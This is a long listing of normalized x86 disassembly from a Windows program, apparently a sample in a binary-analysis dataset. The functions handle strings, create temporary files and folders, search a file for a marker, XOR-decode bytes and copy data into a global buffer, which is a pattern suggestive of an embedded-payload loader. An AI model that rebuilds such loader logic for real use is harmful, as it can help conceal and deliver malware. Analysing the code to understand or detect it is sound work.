cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x10 ]
sub ecx eax
sar ecx 0x1
push ecx
mov edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40d1a0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
cmp edx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
mov esp ebp
pop ebp
retn 0x10
or edx 0xffffffff
sub edx [ ebp + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0xc ]
cmp edx ecx
ja r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x14 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
cmp [ ebp + 0x14 ] 0x0
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
add ecx [ ebp + 0x14 ]
sub ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
push 0x0
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx eax al
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40aa00
add esp 0xc
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
mov edx [ ebp - 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
sub_40d050
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp + 0x14 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40a960
add esp 0xc
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jne r-xdata
mov [ ebp - 0x14 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
sub_40d130
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x8 ]
call sub_40cce0
mov esp ebp
pop ebp
retn 0x4
sub_40d160
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c310
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
cmp eax [ edx ]
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov al [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40d1a0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
mov ecx [ ebp + 0x10 ]
call sub_40b280
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x10 ]
call sub_40b280
sub eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
or edx 0xffffffff
sub edx [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp + 0xc ]
cmp edx ecx
ja r-xdata
mov ecx [ ebp - 0x10 ]
mov [ ebp + 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
sub eax [ ebp + 0xc ]
sub eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
add edx [ ebp + 0x18 ]
sub edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x0
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40ba60
mov eax [ ebp + 0x18 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40aa70
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp + 0x10 ]
call sub_40b5e0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa00
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
ja r-xdata
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x14 ]
lea eax [ eax + edx * 2 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x18 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
ja r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40aa70
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0xc ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0x18 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
mov eax [ ebp + 0x18 ]
sub eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x14 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
mov ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x18 ]
lea ecx [ edx + eax * 2 ]
push ecx
call sub_40aa70
add esp 0xc
mov edx [ ebp + 0x18 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x14 ]
add ecx [ ebp + 0x18 ]
sub ecx [ ebp + 0xc ]
lea edx [ eax + ecx * 2 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aa70
add esp 0xc
jmp r-xdata
sub_40d4c0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x1 ]
call sub_40cc70
push eax
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x2 ]
call sub_40cc70
push eax
call sub_40d4f0
add esp 0x8
mov esp ebp
pop ebp
retn
sub_40d500
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov cx [ ebp + 0xc ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x2
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
sub_40d590
push ebp
mov ebp esp
push 0xffffffff
push sub_41c038
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x2c ] 0x0
mov ecx [ ebp + 0xc ]
call sub_40b280
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x30 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_40f180
push eax
push 0x0
mov edx [ ebp + 0x10 ]
push edx
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40f070
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40f070
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_40f110
push 0x0
push 0x0
mov edx [ ebp - 0x34 ]
push edx
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_40f0f0
push eax
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_40f180
push eax
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
call [ WideCharToMultiByte@IAT ]
lea edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40f0a0
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40b0a0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
call sub_40f070
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0xc
sub_40d6c0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x418 ] 0x0
xor eax eax
mov [ ebp - 0x414 ] ax
push 0x206
push 0x0
lea ecx [ ebp - 0x412 ]
push ecx
call sub_412270
add esp 0xc
push 0x104
lea edx [ ebp - 0x414 ]
push edx
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call sub_412270
add esp 0xc
lea ecx [ ebp - 0x20c ]
push ecx
push 0x0
push r--data
lea edx [ ebp - 0x414 ]
push edx
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
call [ CreateDirectoryW@IAT ]
lea edx [ ebp - 0x20c ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b0f0
mov eax [ ebp - 0x418 ]
or eax 0x1
mov [ ebp - 0x418 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x4
sub_40d7a0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x418 ] 0x0
push 0x208
push 0x0
lea eax [ ebp - 0x20c ]
push eax
call sub_412270
add esp 0xc
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
push 0x0
lea edx [ ebp - 0x414 ]
push edx
call sub_412270
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push 0x0
push r--data
lea ecx [ ebp - 0x20c ]
push ecx
call [ GetTempFileNameW@IAT ]
lea edx [ ebp - 0x414 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b0f0
mov eax [ ebp - 0x418 ]
or eax 0x1
mov [ ebp - 0x418 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x4
sub_40d860
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jl r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
lea edx [ edx + ecx + 0x7 ]
mov eax [ ebp + 0xc ]
cmp edx [ eax ]
jne r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0xc
sub_40d8a0
push ebp
mov ebp esp
mov eax 0x1050
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1018 ] ecx
mov [ ebp - 0x100c ] 0x0
mov [ ebp - 0x1010 ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1038 ]
push ecx
mov ecx [ ebp - 0x1018 ]
call sub_40d590
mov [ ebp - 0x101c ] eax
push r--data
mov ecx [ ebp - 0x101c ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x100c ] eax
lea ecx [ ebp - 0x1038 ]
call sub_40b0a0
push 0x0
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x1050 ]
push eax
mov ecx [ ebp - 0x1018 ]
call sub_40d590
mov [ ebp - 0x1020 ] eax
push r--data
mov ecx [ ebp - 0x1020 ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x1010 ] eax
lea ecx [ ebp - 0x1050 ]
call sub_40b0a0
cmp [ ebp - 0x100c ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x1010 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x1014 ] 0x0
mov ecx [ ebp - 0x100c ]
push ecx
call sub_410937
add esp 0x4
mov edx [ ebp - 0x1010 ]
push edx
call sub_410937
add esp 0x4
mov al 0x1
mov edx [ ebp - 0x100c ]
push edx
push 0x1000
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_410169
add esp 0x10
mov [ ebp - 0x1014 ] eax
mov [ ebp - 0x1008 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1008 ]
cmp edx [ ebp - 0x1014 ]
jge r-xdata
mov ecx [ ebp - 0x1010 ]
push ecx
mov edx [ ebp - 0x1014 ]
push edx
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_41039b
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1008 ]
movzx ecx [ ebp + eax - 0x1004 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x100c ]
push ecx
call sub_410b70
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1008 ]
movzx eax [ ebp + edx - 0x1004 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp - 0x1008 ]
add ecx 0x1
mov [ ebp - 0x1008 ] ecx
mov ecx [ ebp - 0x1008 ]
movzx edx [ ebp + ecx - 0x1004 ]
xor edx [ ebp + 0x10 ]
mov eax [ ebp - 0x1008 ]
mov [ ebp + eax - 0x1004 ] dl
sub_40da80
push ebp
mov ebp esp
mov eax 0x206c
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x2040 ] ecx
mov [ ebp - 0x2028 ] 0x0
mov [ ebp - 0xc ] 0x0
xor eax eax
mov [ ebp - 0xb ] eax
mov [ ebp - 0x7 ] ax
mov [ ebp - 0x1014 ] 0x0
push 0x1006
push 0x0
lea ecx [ ebp - 0x1013 ]
push ecx
call sub_412270
add esp 0xc
mov [ ebp - 0x201c ] 0x0
mov [ ebp - 0x2030 ] 0x0
mov [ ebp - 0x2018 ] 0x0
mov [ ebp - 0x2038 ] 0x0
push 0x0
mov edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x206c ]
push eax
mov ecx [ ebp - 0x2040 ]
call sub_40d590
mov [ ebp - 0x204c ] eax
push r--data
mov ecx [ ebp - 0x204c ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x2028 ] eax
cmp [ ebp - 0x2028 ] 0x0
je r-xdata
mov [ ebp - 0x203c ] 0x0
mov [ ebp - 0x203c ] 0x1
jmp r-xdata
mov edx [ ebp - 0x2038 ]
mov [ ebp - 0x2054 ] edx
xor al al
mov eax [ ebp - 0x2028 ]
push eax
call sub_410b70
add esp 0x4
test eax eax
jne r-xdata
mov cl [ ebp - 0x203c ]
mov [ ebp - 0x201d ] cl
lea ecx [ ebp - 0x206c ]
call sub_40b0a0
movzx edx [ ebp - 0x201d ]
test edx edx
je r-xdata
mov ecx [ ebp - 0x2028 ]
push ecx
call sub_410937
add esp 0x4
mov ecx [ ebp - 0x2028 ]
push ecx
push 0x1000
push 0x1
lea edx [ ebp - 0x2014 ]
push edx
call sub_410169
add esp 0x10
mov [ ebp - 0x201c ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1014 ] eax
mov cx [ ebp - 0x8 ]
mov [ ebp - 0x1010 ] cx
mov dl [ ebp - 0x6 ]
mov [ ebp - 0x100e ] dl
mov eax [ ebp - 0x201c ]
push eax
lea ecx [ ebp - 0x2014 ]
push ecx
lea edx [ ebp - 0x100d ]
push edx
call sub_412c10
add esp 0xc
mov [ ebp - 0x2018 ] 0x0
mov [ ebp - 0x2024 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x201c ]
add ecx 0x6
cmp [ ebp - 0x2024 ] ecx
jge r-xdata
cmp [ ebp - 0x201c ] 0x7
jl r-xdata
mov edx [ ebp - 0x2024 ]
movzx eax [ ebp + edx - 0x1013 ]
mov [ ebp - 0x2050 ] eax
mov ecx [ ebp - 0x2024 ]
movzx edx [ ebp + ecx - 0x1014 ]
mov [ ebp - 0x2044 ] edx
lea eax [ ebp - 0x2018 ]
push eax
lea ecx [ ebp - 0x2050 ]
push ecx
lea edx [ ebp - 0x2044 ]
push edx
mov ecx [ ebp - 0x2040 ]
call sub_40d860
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x2030 ]
add eax [ ebp - 0x201c ]
mov [ ebp - 0x2030 ] eax
jmp r-xdata
mov edx [ ebp - 0x201c ]
sub edx 0x7
mov [ ebp - 0x202c ] edx
mov [ ebp - 0x2034 ] 0x0
jmp r-xdata
mov [ ebp - 0x2018 ] 0x0
mov eax [ ebp - 0x2018 ]
mov [ ebp - 0x2048 ] eax
mov ecx [ ebp - 0x2018 ]
mov [ ebp - 0x2048 ] ecx
mov edx [ ebp - 0x2018 ]
add edx 0x1
mov [ ebp - 0x2018 ] edx
jmp r-xdata
mov edx [ ebp - 0x202c ]
cmp edx [ ebp - 0x201c ]
jge r-xdata
cmp [ ebp - 0x2018 ] 0x7
jne r-xdata
mov edx [ ebp - 0x2018 ]
mov [ ebp - 0x2038 ] edx
mov ecx [ ebp - 0x2038 ]
cmp ecx [ ebp - 0x2018 ]
jge r-xdata
mov eax [ ebp - 0x2034 ]
mov ecx [ ebp - 0x202c ]
mov dl [ ebp + ecx - 0x2014 ]
mov [ ebp + eax - 0xc ] dl
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x2024 ]
mov ecx [ ebp - 0x2030 ]
lea edx [ ecx + eax - 0xd ]
mov eax [ ebp + 0xc ]
mov [ eax ] edx
mov ecx [ ebp - 0x2028 ]
push ecx
call sub_410937
add esp 0x4
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x202c ]
add eax 0x1
mov [ ebp - 0x202c ] eax
mov ecx [ ebp - 0x2034 ]
add ecx 0x1
mov [ ebp - 0x2034 ] ecx
mov eax [ ebp - 0x2024 ]
add eax 0x1
mov [ ebp - 0x2024 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
sub_40ddb0
push ebp
mov ebp esp
mov eax 0x103c
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1024 ] ecx
mov [ ebp - 0x1008 ] 0x0
mov [ ebp - 0x1014 ] 0x0
mov [ ebp - 0x1010 ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x103c ]
push ecx
mov ecx [ ebp - 0x1024 ]
call sub_40d590
mov [ ebp - 0x1020 ] eax
push r--data
mov ecx [ ebp - 0x1020 ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x1008 ] eax
cmp [ ebp - 0x1008 ] 0x0
je r-xdata
mov [ ebp - 0x101c ] 0x0
mov [ ebp - 0x101c ] 0x1
jmp r-xdata
xor al al
push 0x0
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
push edx
mov eax [ ebp - 0x1008 ]
push eax
call sub_410801
add esp 0xc
mov dl [ ebp - 0x101c ]
mov [ ebp - 0x1009 ] dl
lea ecx [ ebp - 0x103c ]
call sub_40b0a0
movzx eax [ ebp - 0x1009 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1008 ]
push ecx
call sub_410937
add esp 0x4
mov edx [ ebp - 0x1008 ]
push edx
push 0x1000
push 0x1
lea eax [ ebp - 0x1004 ]
push eax
call sub_410169
add esp 0x10
mov [ ebp - 0x1014 ] eax
mov ecx [ ebp - 0x1010 ]
add ecx [ ebp - 0x1014 ]
cmp ecx 0x7d010
jle r-xdata
mov [ ebp - 0x1018 ] 0x0
jmp r-xdata
mov edx 0x7d010
sub edx [ ebp - 0x1010 ]
mov [ ebp - 0x1014 ] edx
mov ecx [ ebp - 0x1018 ]
cmp ecx [ ebp - 0x1014 ]
jge r-xdata
mov edx [ ebp - 0x1010 ]
add edx [ ebp - 0x1014 ]
mov [ ebp - 0x1010 ] edx
cmp [ ebp - 0x1010 ] 0x7d010
jne r-xdata
mov edx [ ebp - 0x1010 ]
add edx [ ebp - 0x1018 ]
mov eax [ ebp - 0x1018 ]
mov cl [ ebp + eax - 0x1004 ]
mov [ edx + rw-data ] cl
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1008 ]
push eax
call sub_410937
add esp 0x4
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x1018 ]
add eax 0x1
mov [ ebp - 0x1018 ] eax
mov ecx [ ebp - 0x1008 ]
push ecx
call sub_410b70
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
sub_40df90
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
xor eax eax
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
push 0x0
call sub_40d540
add esp 0x4
push eax
call sub_410bb9
add esp 0x4
